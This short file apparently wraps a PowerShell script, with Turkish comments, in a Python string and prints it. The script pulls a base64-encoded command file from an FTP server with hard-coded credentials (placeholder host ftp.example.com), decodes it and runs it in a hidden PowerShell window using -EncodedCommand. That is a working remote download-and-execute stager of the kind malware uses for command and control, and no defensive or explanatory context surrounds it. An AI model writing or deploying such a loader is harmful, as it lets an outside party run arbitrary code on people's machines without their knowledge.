x = """




# FTP'den komut çeker, base64 çözer ve çalıştırır
function Invoke-FTPCommand {
    param(
        [string]$ftpHost = "ftp.example.com",
        [string]$ftpUser = "ftpuser",
        [string]$ftpPass = "ftppassword",
        [string]$ftpFile = "ps_command.b64"
    )

    $uri = "ftp://$ftpHost/$ftpFile"
    $webclient = New-Object System.Net.WebClient
    $webclient.Credentials = New-Object System.Net.NetworkCredential($ftpUser, $ftpPass)

    try {
        $encodedCommand = $webclient.DownloadString($uri)
    } catch {
        Write-Error "FTP'den komut alınamadı: $_"
        return
    }

    # Base64 UTF-16LE çöz
    try {
        $bytes = [System.Convert]::FromBase64String($encodedCommand)
        $psCommand = [System.Text.Encoding]::Unicode.GetString($bytes)
    } catch {
        Write-Error "Base64 çözümleme hatası: $_"
        return
    }

    Write-Host "Komut başarıyla çözüldü:"
    Write-Host $psCommand

    # Komutu tekrar base64'leyip -EncodedCommand ile çalıştır
    $encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($psCommand))
    $startInfo = New-Object System.Diagnostics.ProcessStartInfo
    $startInfo.FileName = "powershell.exe"
    $startInfo.Arguments = "-NoProfile -WindowStyle Hidden -EncodedCommand $encoded"
    $startInfo.UseShellExecute = $false
    $startInfo.RedirectStandardOutput = $true
    $startInfo.CreateNoWindow = $true

    $process = [System.Diagnostics.Process]::Start($startInfo)
    $output = $process.StandardOutput.ReadToEnd()
    $process.WaitForExit()
    
    Write-Host "Komut çalıştı. Çıktı:"
    Write-Host $output
}

# Çalıştır
Invoke-FTPCommand
"""
print(x)